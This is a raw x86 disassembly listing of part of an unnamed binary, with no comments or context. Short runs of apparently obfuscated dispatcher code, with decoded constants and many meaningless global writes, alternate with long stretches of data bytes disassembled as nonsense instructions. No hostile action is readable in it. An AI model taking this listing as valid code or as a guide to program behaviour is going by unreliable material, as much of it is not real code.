  40e1ce:	nop
  40e1cf:	mov    bl,0x2f
  40e1d1:	push   ss
  40e1d2:	add    ecx,DWORD PTR [esi]
  40e1d4:	dec    edx
  40e1d5:	xchg   esi,eax
  40e1d6:	dec    ebx
  40e1d7:	shr    ah,1
  40e1d9:	shl    BYTE PTR [edi],cl
  40e1db:	or     bh,bh
  40e1dd:	sbb    BYTE PTR [ecx*8-0x570b7531],dl
  40e1e4:	jge    0x40e17c
  40e1e6:	push   esi
  40e1e7:	sub    esp,ebx
  40e1e9:	inc    esi
  40e1ea:	retf   0xb30a
  40e1ed:	out    0x8a,eax
  40e1ef:	xchg   DWORD PTR [edx-0x30],edi
  40e1f2:	pusha  
  40e1f3:	std    
  40e1f4:	mov    dl,0x35
  40e1f6:	test   esp,0x6281a6e
  40e1fc:	stos   DWORD PTR es:[edi],eax
  40e1fd:	mov    esp,0x210713ee
  40e202:	cdq    
  40e203:	repnz test DWORD PTR ss:[ebx+0x69],edx
  40e208:	pop    ss
  40e209:	mov    ds:0xa7ad8299,eax
  40e20e:	shl    DWORD PTR [ecx-0x160a9ed7],cl
  40e214:	mov    BYTE PTR [ebx+0x6f],bh
  40e217:	mov    ch,0x58
  40e219:	adc    BYTE PTR [edi+0x636f6de5],al
  40e21f:	(bad)  
  40e221:	mov    ebp,DWORD PTR [esi]
  40e223:	es leave 
  40e225:	das    
  40e226:	inc    si
  40e228:	out    dx,eax
  40e229:	(bad)  
  40e22a:	mov    dl,0x71
  40e22c:	jo     0x40e254
  40e22e:	(bad)  
  40e230:	mov    ds:0xded8f0c4,eax
  40e235:	cld    
  40e236:	mov    dh,0xb
  40e238:	mov    ss,esi
  40e23a:	ds ja  0x40e1cd
  40e23d:	pushf  
  40e23e:	push   esp
  40e23f:	ficom  DWORD PTR [ebp+edx*8-0x24]
  40e243:	scas   eax,DWORD PTR es:[edi]
  40e244:	mov    edx,0xb134410
  40e249:	sbb    ecx,ebx
  40e24b:	xlat   BYTE PTR ds:[ebx]
  40e24c:	test   dl,bl
  40e24e:	(bad)  
  40e24f:	cmp    ecx,DWORD PTR [esi]
  40e251:	test   ebx,0xeeb3372b
  40e257:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e258:	sbb    al,0x7d
  40e25a:	add    DWORD PTR [eax-0x1b84cf53],edx
  40e260:	into   
  40e261:	ins    DWORD PTR es:[edi],dx
  40e262:	mov    ss,WORD PTR [eax-0x1e584edb]
  40e268:	fwait
  40e269:	enter  0x1eae,0xe
  40e26d:	push   esp
  40e26e:	and    edi,eax
  40e270:	mov    cl,0x6b
  40e272:	shr    BYTE PTR [eax],1
  40e274:	jmp    DWORD PTR [ebp+0x33]
  40e277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e278:	xchg   ebp,eax
  40e279:	scas   eax,DWORD PTR es:[edi]
  40e27a:	scas   al,BYTE PTR es:[edi]
  40e27b:	out    0x12,eax
  40e27d:	dec    edx
  40e27e:	jbe    0x40e2f5
  40e280:	nop
  40e281:	lahf   
  40e282:	mov    DWORD PTR [ebp-0x18],eax
  40e285:	mov    edi,DWORD PTR [ebp+0x8]
  40e288:	inc    DWORD PTR ds:0x43378b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x433863,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x4338ab
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433817,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43378b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x433857,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43381f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43379b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43389f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x4338ab,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x43385f,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43389b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x433857,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x4337d3,0x4337df
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x433827,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x433853,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x433857,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433783,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433783,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433817,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433783,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x43382f,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x4338ab
  40e3da:	and    DWORD PTR ds:0x43378b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x4337e3,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433893
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	mov    bh,0x97
  40e416:	lahf   
  40e417:	push   ebx
  40e418:	push   ss
  40e419:	cwde   
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e3cc
  40e421:	fisubr WORD PTR [ebp+0x39]
  40e424:	imul   ebx,DWORD PTR [ebx-0x1d],0xffffffa0
  40e428:	lock fidivr WORD PTR [eax-0x59]
  40e42c:	xchg   DWORD PTR [edi],ebp
  40e42e:	in     eax,dx
  40e42f:	push   edi
  40e430:	sbb    DWORD PTR [edx-0x5f36a05b],esp
  40e436:	xor    BYTE PTR [ecx],ah
  40e438:	mov    al,ds:0x380ee985
  40e43d:	push   ebx
  40e43e:	enter  0x5d88,0xbc
  40e442:	bound  edi,QWORD PTR [ecx]
  40e444:	jp     0x40e41d
  40e446:	sub    BYTE PTR [ebx+0x2a796e7b],bl
  40e44c:	sbb    BYTE PTR [ebx+edx*2],ch
  40e44f:	mov    al,ds:0x485460f6
  40e454:	mov    DWORD PTR es:[ecx],edx
  40e457:	sub    edx,esp
  40e459:	test   BYTE PTR [ebp-0x64],al
  40e45c:	xchg   BYTE PTR [edi],dl
  40e45e:	bnd js 0x40e473
  40e461:	bnd jae 0x40e481
  40e464:	inc    ebp
  40e465:	sbb    ah,dh
  40e467:	push   0xce14fea6
  40e46c:	out    dx,al
  40e46d:	cld    
  40e46e:	push   eax
  40e46f:	js     0x40e458
  40e471:	xchg   esp,eax
  40e472:	xchg   BYTE PTR [edi],dh
  40e474:	push   ecx
  40e475:	lods   al,BYTE PTR ds:[esi]
  40e476:	je     0x40e4c5
  40e478:	repnz test eax,0x63ffa86e
  40e47e:	jbe    0x40e475
  40e480:	daa    
  40e481:	cmp    BYTE PTR [esi+edx*4],ch
  40e484:	call   0x39c4cfd1
  40e489:	cwde   
  40e48a:	mov    BYTE PTR [ebp+esi*1+0x7c],bh
  40e48e:	adc    DWORD PTR [edx-0x78],edi
  40e491:	leave  
  40e492:	es inc edi
  40e494:	sti    
  40e495:	js     0x40e41c
  40e497:	cmp    al,0x41
  40e499:	push   ds
  40e49a:	mov    dl,0x48
  40e49c:	push   edi
  40e49d:	jmp    0x40e467
  40e49f:	addr16 jmp 0x40e50b
  40e4a2:	popa   
  40e4a3:	int    0x3c
  40e4a5:	jne    0x40e497
  40e4a7:	enter  0x3c10,0x59
  40e4ab:	ret    
  40e4ac:	in     eax,0x15
  40e4ae:	and    eax,DWORD PTR [eax-0x10]
  40e4b1:	mov    dh,0x89
  40e4b3:	mov    cl,0x38
  40e4b5:	mov    ds:0xedf2bbb7,al
  40e4ba:	bound  esi,QWORD PTR ds:0xbefca398
  40e4c0:	pop    ebp
  40e4c1:	push   esp
  40e4c2:	(bad)  
  40e4c3:	ficom  WORD PTR [esi*4+0x4744106c]
  40e4ca:	scas   eax,DWORD PTR es:[edi]
  40e4cb:	sub    BYTE PTR [ebp+0x6b],al
  40e4ce:	fidiv  WORD PTR [eax-0x1a4e4eca]
  40e4d4:	cmp    al,0x4d
  40e4d6:	(bad)  
  40e4d7:	rcl    BYTE PTR [edx+0x52],cl
  40e4da:	imul   BYTE PTR [eax+0x54]
  40e4dd:	daa    
  40e4de:	es push 0x7f
  40e4e1:	fdivrp st(4),st
  40e4e3:	ins    DWORD PTR es:[edi],dx
  40e4e4:	sbb    eax,0x9c230720
  40e4e9:	mov    cl,0x5c
  40e4eb:	and    eax,0x2cc6d747
  40e4f0:	inc    eax
  40e4f1:	add    BYTE PTR [edx],al
  40e4f3:	or     DWORD PTR [ecx-0x73],esi
  40e4f6:	xor    esp,DWORD PTR [ebx+ecx*1-0x49a4f283]
  40e4fd:	inc    esp
  40e4fe:	mov    bh,0xce
  40e500:	mov    ah,0xa7
  40e502:	ret    
  40e503:	inc    BYTE PTR [eax-0x4663676b]
  40e509:	xchg   DWORD PTR [ebx],ecx
  40e50b:	stc    
  40e50c:	in     eax,dx
  40e50d:	fisubr DWORD PTR [eax-0x7c]
  40e510:	jecxz  0x40e4a5
  40e512:	fadd   DWORD PTR [ebp-0x593bd0d1]
  40e518:	add    BYTE PTR [edi-0xf5a02a1],al
  40e51e:	aas    
  40e51f:	fs add eax,0xaf5bc6a1
  40e525:	into   
  40e526:	mov    bh,0x2
  40e528:	or     DWORD PTR [eax+0x60],ecx
  40e52b:	shr    esi,1
  40e52d:	(bad)  
  40e52e:	lea    edi,[ecx+0x1b5b4644]
  40e534:	pop    esp
  40e535:	je     0x40e583
  40e537:	pop    ss
  40e538:	xchg   esi,eax
  40e539:	shr    BYTE PTR [ebp-0xbba74ee],0x81
  40e540:	or     eax,0x433823
  40e545:	imul   edi,DWORD PTR [eax],0x43
  40e548:	add    BYTE PTR [ebx],dh
  40e54a:	mov    BYTE PTR [ebx],0xc3
  40e54d:	sbb    DWORD PTR ds:0x43385b,0x43382f
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0xd3f261b8
  40e5b4:	jge    0x40e5a7
  40e5b6:	jb     0x40e5e2
  40e5b8:	cdq    
  40e5b9:	jle    0x40e639
  40e5bb:	adc    bh,BYTE PTR [edi+0x7e]
  40e5be:	jle    0x40e56e
  40e5c0:	fst    DWORD PTR [ebx]
  40e5c2:	stos   DWORD PTR es:[edi],eax
  40e5c3:	mov    esp,0x129b50da
  40e5c8:	fisttp WORD PTR [eax]
  40e5ca:	repz xor esp,esi
  40e5cd:	adc    al,0xd2
  40e5cf:	in     al,0xfa
  40e5d1:	push   ebp
  40e5d2:	cmp    al,BYTE PTR [ecx+0x5d]
  40e5d5:	out    dx,eax
  40e5d6:	push   cs
  40e5d7:	fwait
  40e5d8:	inc    ecx
  40e5d9:	fild   DWORD PTR [esi-0x2a5d6c50]
  40e5df:	jg     0x40e589
  40e5e1:	mov    edi,0x94eef6ed
  40e5e6:	inc    edi
  40e5e7:	jo     0x40e58f
  40e5e9:	fadd   st(2),st
  40e5eb:	jb     0x40e65e
  40e5ed:	mov    WORD PTR [ebx],fs
  40e5ef:	sub    eax,DWORD PTR [esi]
  40e5f1:	jae    0x40e5d1
  40e5f3:	inc    ebp
  40e5f4:	pop    esp
  40e5f5:	outs   dx,BYTE PTR ds:[esi]
  40e5f6:	sbb    eax,0xda6ff817
  40e5fb:	out    0xa6,al
  40e5fd:	sub    ch,BYTE PTR [ebp+0x2f16523c]
  40e603:	imul   bh
  40e605:	pop    edx
  40e606:	hlt    
  40e607:	xchg   DWORD PTR [edx],eax
  40e609:	je     0x40e624
  40e60b:	jge    0x40e615
  40e60d:	jecxz  0x40e646
  40e60f:	iret   
  40e610:	imul   ebx,DWORD PTR [edx-0x6d83f691],0x13
  40e617:	rol    BYTE PTR [esi],1
  40e619:	cld    
  40e61a:	retf   0xa60b
  40e61d:	fbld   TBYTE PTR es:[esi+0x7e344683]
  40e624:	mov    eax,0x90af5ee7
  40e629:	cmp    esi,0x1769dfb
  40e62f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e630:	add    BYTE PTR [esp+esi*1-0x524f4a78],cl
  40e637:	sbb    BYTE PTR [ebx-0x5d],al
  40e63a:	or     al,0x6c
  40e63c:	es test eax,0x12174d7e
  40e642:	daa    
  40e643:	leave  
  40e644:	mov    edx,0x30317775
  40e649:	push   ds
  40e64a:	repnz loope 0x40e641
  40e64d:	push   ss
  40e64e:	or     dh,bh
  40e650:	ss cdq 
  40e652:	jnp    0x40e631
  40e654:	and    bh,al
  40e656:	daa    
  40e657:	movaps xmm6,XMMWORD PTR [ecx-0x7e30aabc]
  40e65e:	bound  edx,QWORD PTR [esi+0x63]
  40e661:	pop    ecx
  40e662:	sbb    ah,BYTE PTR [edi]
  40e664:	aam    0xb2
  40e666:	rcr    edi,1
  40e668:	mov    ch,0x68
  40e66a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e66b:	cmc    
  40e66c:	std    
  40e66d:	and    BYTE PTR [ebx+0xa],dh
  40e670:	or     eax,0x1cc9d9ed
  40e675:	jmp    0x40e684
  40e677:	lods   al,BYTE PTR ds:[esi]
  40e678:	call   0x282f:0x8997f78b
  40e67f:	ja     0x40e6cb
  40e681:	imul   ebx,DWORD PTR [ebp+0x5a032c18],0x568a8e7c
  40e68b:	mov    cs,WORD PTR [ecx-0x7]
  40e68e:	iret   
  40e68f:	adc    esp,ebp
  40e691:	cs leave 
  40e693:	push   ss
  40e694:	sub    eax,0x252664d5
  40e699:	test   BYTE PTR [esi],al
  40e69b:	mov    esp,DWORD PTR [ebp+0x3e]
  40e69e:	sub    bl,BYTE PTR [ebp+0x53]
  40e6a1:	mov    fs,WORD PTR [eax-0x14]
  40e6a4:	xchg   edi,eax
  40e6a5:	xor    eax,0x5d31a530
  40e6aa:	sbb    edi,DWORD PTR [eax+0xf]
  40e6ad:	cdq    
  40e6ae:	jns    0x40e658
  40e6b0:	push   ebx
  40e6b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6b2:	fcom   DWORD PTR [ebx-0x5f]
  40e6b5:	icebp  
  40e6b6:	xlat   BYTE PTR ds:[ebx]
  40e6b7:	mov    edx,0xd631984e
  40e6bc:	adc    ch,al
  40e6be:	div    DWORD PTR [ebx]
  40e6c0:	dec    edx
  40e6c1:	add    eax,0x5f02520a
  40e6c6:	popa   
  40e6c7:	sbb    bl,BYTE PTR [esi]
  40e6c9:	inc    edi
  40e6ca:	add    BYTE PTR [edx],bl
  40e6cc:	in     al,0x41
  40e6ce:	and    cl,BYTE PTR [ebp+esi*8+0x5b1fb4e6]
  40e6d5:	jmp    0xa1aa:0xcac956af
  40e6dc:	xor    al,0x3b
  40e6de:	inc    ecx
  40e6df:	add    BYTE PTR [ecx+0x458b0845],cl
  40e6e5:	in     al,dx
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx+0x39416e5f]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e692
  40e704:	clc    
  40e705:	imul   DWORD PTR es:[eax+0x64804339]
  40e70c:	lods   eax,DWORD PTR ds:[esi]
  40e70d:	mov    ch,0xdb
  40e70f:	fs push esp
  40e711:	scas   eax,DWORD PTR es:[edi]
  40e712:	and    bl,al
  40e714:	mov    gs,ecx
  40e716:	int3   
  40e717:	mov    dh,0x47
  40e719:	mov    ecx,0x1d42fbb8
  40e71e:	dec    esi
  40e71f:	lds    edi,FWORD PTR [esi+0x8]
  40e722:	lods   eax,DWORD PTR ds:[esi]
  40e723:	std    
  40e724:	test   al,0x51
  40e726:	cli    
  40e727:	cs scas al,BYTE PTR es:[edi]
  40e729:	xchg   ebp,eax
  40e72a:	jecxz  0x40e751
  40e72c:	mov    eax,0x5534b79
  40e731:	jg     0x40e6d7
  40e733:	dec    eax
  40e734:	fsub   DWORD PTR [esi+ebx*1]
  40e737:	xor    al,bh
  40e739:	xchg   esp,eax
  40e73a:	leave  
  40e73b:	es mov bh,0x36
  40e73e:	loop   0x40e7a3
  40e740:	xor    DWORD PTR [eax-0x5fd6ef46],edi
  40e746:	scas   eax,DWORD PTR es:[edi]
  40e747:	and    BYTE PTR [edx],ah
  40e749:	arpl   WORD PTR [ecx],cx
  40e74b:	test   al,0x39
  40e74d:	jae    0x40e75b
  40e74f:	cwde   
  40e750:	repz mov eax,0xc4d7ca0b
  40e756:	iret   
  40e757:	adc    al,0x8a
  40e759:	inc    esi
  40e75a:	cmp    edx,edx
  40e75c:	xlat   BYTE PTR ds:[ebx]
  40e75d:	out    0x7c,al
  40e75f:	fsubr  DWORD PTR [eax-0x13]
  40e762:	lahf   
  40e763:	shl    DWORD PTR [esi-0x5c6347ea],1
  40e769:	loope  0x40e760
  40e76b:	sub    eax,esi
  40e76d:	cdq    
  40e76e:	lds    ebp,FWORD PTR ss:[ebx]
  40e771:	sub    BYTE PTR [ebx],ch
  40e773:	gs scas al,BYTE PTR es:[edi]
  40e775:	retf   0x91f2
  40e778:	bound  esi,QWORD PTR [edi-0x68377fb8]
  40e77e:	fisubr WORD PTR ds:0x1d73da9e
  40e784:	jg     0x40e742
  40e786:	nop
  40e787:	scas   al,BYTE PTR es:[edi]
  40e788:	adc    eax,0x15fc3c5e
  40e78d:	push   0xffffffee
  40e78f:	jmp    0x40e741
  40e791:	or     bl,al
  40e793:	inc    esi
  40e794:	ds cmc 
  40e796:	pop    ds
  40e797:	push   ebp
  40e798:	lods   al,BYTE PTR ds:[esi]
  40e799:	and    BYTE PTR [ebx-0x1e68f2ba],bh
  40e79f:	push   eax
  40e7a0:	int    0x5c
  40e7a2:	fsubp  st(4),st
  40e7a4:	out    dx,al
  40e7a5:	xchg   edi,eax
  40e7a6:	ds jne 0x40e815
  40e7a9:	fsub   QWORD PTR [esi+0xe]
  40e7ac:	push   edi
  40e7ad:	jmp    0xe606d684
  40e7b2:	aas    
  40e7b3:	xor    bl,0xcf
  40e7b6:	push   esi
  40e7b7:	add    BYTE PTR [esi],bl
  40e7b9:	and    DWORD PTR [ebx],ecx
  40e7bb:	push   cs
  40e7bc:	rcr    DWORD PTR [esi-0x62],1
  40e7bf:	mov    dh,0xc2
  40e7c1:	je     0x40e773
  40e7c3:	jnp    0x40e757
  40e7c5:	add    cl,BYTE PTR [edx-0x6981072f]
  40e7cb:	popa   
  40e7cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7cd:	lock xor ebx,edx
  40e7d0:	jnp    0x40e84d
  40e7d2:	sbb    esp,DWORD PTR [esi-0x63]
  40e7d5:	pop    esp
  40e7d6:	sti    
  40e7d7:	jo     0x40e847
  40e7d9:	add    BYTE PTR [ecx+0x1b],ch
  40e7dc:	inc    ebx
  40e7dd:	push   0x3d
  40e7df:	sub    DWORD PTR [edi-0x4e56a8f7],esi
  40e7e5:	inc    ecx
  40e7e6:	das    
  40e7e7:	(bad)  
  40e7e8:	jge    0x40e77e
  40e7ea:	and    DWORD PTR [esi],ecx
  40e7ec:	and    edi,esi
  40e7ee:	jns    0x40e857
  40e7f0:	jbe    0x40e834
  40e7f2:	mov    dh,0xb4
  40e7f4:	mov    al,ds:0x37b46470
  40e7f9:	xchg   ebx,ebp
  40e7fb:	cdq    
  40e7fc:	imul   ebx,eax,0x1a
  40e7ff:	fcmovb st,st(3)
  40e801:	mov    al,0xeb
  40e803:	jmp    0x40e794
  40e805:	in     eax,dx
  40e806:	clc    
  40e807:	ret    0x5b91
  40e80a:	iret   
  40e80b:	repnz int 0xf
  40e80e:	mov    edx,0xd57caf29
  40e813:	jge    0x40e831
  40e815:	loop   0x40e80a
  40e817:	je     0x40e871
  40e819:	cwde   
  40e81a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e81b:	dec    ecx
  40e81c:	or     edx,ecx
  40e81e:	lods   al,BYTE PTR ds:[esi]
  40e81f:	mov    DWORD PTR [ebp-0x4],eax
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e8cf
  40e854:	jbe    0x40e80a
  40e856:	xor    dl,ah
  40e858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e80f
  40e860:	jno    0x40e87a
  40e862:	in     al,0x34
  40e864:	push   esp
  40e865:	adc    al,0x7
  40e867:	lods   al,BYTE PTR ds:[esi]
  40e868:	fs mov bl,0x94
  40e86b:	mov    esi,eax
  40e86d:	xor    edx,ebp
  40e86f:	mov    DWORD PTR [edi+0x21],ecx
  40e872:	adc    eax,0x3f1d4073
  40e877:	sbb    eax,0x7f5c0920
  40e87c:	xor    ch,BYTE PTR [ecx]
  40e87e:	pusha  
  40e87f:	pop    edi
  40e880:	dec    esi
  40e881:	inc    edi
  40e882:	push   ds
  40e883:	fisttp DWORD PTR [edi+0x3164c058]
  40e889:	enter  0x461f,0x8a
  40e88d:	inc    ecx
  40e88e:	(bad)  
  40e88f:	and    al,0x3e
  40e891:	xor    ch,al
  40e893:	mov    al,ds:0x958f841d
  40e898:	sbb    BYTE PTR [ebp-0x77e9ecfa],0x41
  40e89f:	xchg   BYTE PTR [ebp+0xd535dd4],dh
  40e8a5:	test   eax,0xec770d61
  40e8aa:	das    
  40e8ab:	sub    eax,0x3e53cfb2
  40e8b0:	pop    ecx
  40e8b1:	or     DWORD PTR [edi+eiz*4],ecx
  40e8b4:	(bad)  
  40e8b5:	loopne 0x40e91e
  40e8b7:	data16 jne 0x40e8ca
  40e8ba:	repnz fcom DWORD PTR [ebp-0x44]
  40e8be:	push   ebx
  40e8bf:	xchg   esp,eax
  40e8c0:	add    al,0x51
  40e8c2:	push   0xffffffc3
  40e8c4:	add    al,0x6e
  40e8c6:	sub    bl,BYTE PTR ds:[eax+0x75]
  40e8ca:	dec    ebp
  40e8cb:	mov    ebx,0xd91185e5
  40e8d0:	mov    ds:0x4ad94b77,al
  40e8d5:	inc    esp
  40e8d6:	pop    ds
  40e8d7:	aaa    
  40e8d8:	fldenv [edx+0x1f]
  40e8db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8dc:	sbb    DWORD PTR [esp+ebx*4+0x709306ac],ebx
  40e8e3:	out    dx,al
  40e8e4:	aaa    
  40e8e5:	loop   0x40e8f7
  40e8e7:	rcl    BYTE PTR [ecx-0x674b4062],0xc1
  40e8ee:	add    BYTE PTR [esi+0xd],0x90
  40e8f2:	rcr    BYTE PTR [ebx-0x36],1
  40e8f5:	test   BYTE PTR [edx],cl
  40e8f7:	sub    DWORD PTR [ebp+0x7],esi
  40e8fa:	(bad)  
  40e8fb:	jmp    DWORD PTR ds:0x92b5d9b1
  40e901:	repz in eax,0xc
  40e904:	pop    ebp
  40e905:	and    al,0xdd
  40e907:	xor    BYTE PTR [ebx],dl
  40e909:	test   bh,dl
  40e90b:	adc    al,0xbe
  40e90d:	outs   dx,BYTE PTR ds:[esi]
  40e90e:	rcr    edi,1
  40e910:	in     eax,dx
  40e911:	push   ss
  40e912:	sub    DWORD PTR gs:[ebx-0x17],ebp
  40e916:	dec    BYTE PTR [esp+eax*1]
  40e919:	push   ecx
  40e91a:	rol    bh,1
  40e91c:	in     al,0xb9
  40e91e:	addr16 into 
  40e920:	call   0xfe4cb00
  40e925:	cmp    BYTE PTR [eax],al
  40e927:	not    BYTE PTR [edi+0x63]
  40e92a:	lds    ebp,FWORD PTR [eax-0x72]
  40e92d:	cmp    BYTE PTR [ebx],bh
  40e92f:	cmp    eax,0xb072200f
  40e934:	lea    esp,[ebp-0x67]
  40e937:	push   ecx
  40e938:	adc    al,0x58
  40e93a:	push   ebx
  40e93b:	jno    0x40e9a9
  40e93d:	lea    ebp,[edi-0x1b441c4b]
  40e943:	(bad)  
  40e944:	cwde   
  40e945:	sub    al,0x5b
  40e947:	mov    DWORD PTR [eax+esi*8-0x5f],esi
  40e94b:	mov    al,ds:0xe9531cc4
  40e950:	adc    DWORD PTR [edx+eiz*8],eax
  40e953:	push   0x87d74b93
  40e958:	pop    edx
  40e959:	adc    BYTE PTR [edi+esi*1+0x61],0xc6
  40e95e:	in     al,dx
  40e95f:	dec    ebx
  40e960:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e961:	imul   edi,DWORD PTR [esi+0x39b07cfd],0xb73062e
  40e96b:	ss mov ebx,0xa313edbc
  40e971:	mov    DWORD PTR [ecx+edx*2],edi
  40e974:	popa   
  40e975:	xchg   BYTE PTR [esi-0x45],dh
  40e978:	repnz mov ebp,0x3e850fc8
  40e97e:	stc    
  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0x214171d
  40e99c:	inc    eax
  40e99d:	xchg   BYTE PTR [esi+edi*2+0x7e7f127e],ah
  40e9a4:	jle    0x40e9f8
  40e9a6:	jp     0x40e971
  40e9a8:	push   edx
  40e9a9:	bound  esp,QWORD PTR [eax]
  40e9ab:	lds    edi,FWORD PTR [ebp+0x1586a338]
  40e9b1:	xor    eax,0x329dffeb
  40e9b6:	test   eax,0xb9d793ac
  40e9bb:	sub    bh,bh
  40e9bd:	fwait
  40e9be:	sahf   
  40e9bf:	shl    DWORD PTR [ebp+eax*1-0x3c],1
  40e9c3:	(bad)  
  40e9c4:	mov    ebx,0x8f5c8898
  40e9c9:	mov    WORD PTR [eax-0x79469380],es
  40e9cf:	ins    BYTE PTR es:[edi],dx
  40e9d0:	xchg   edi,eax
  40e9d1:	push   ebp
  40e9d2:	jle    0x40ea4b
  40e9d4:	add    ah,bl
  40e9d6:	push   0xb1a9c5cc
  40e9db:	(bad)  
  40e9dc:	pop    ebp
  40e9dd:	push   dx
  40e9df:	call   0xb40f:0xae68092a
  40e9e6:	add    BYTE PTR es:[esi-0x5df8d9d0],bl
  40e9ed:	xchg   edi,eax
  40e9ee:	push   ebp
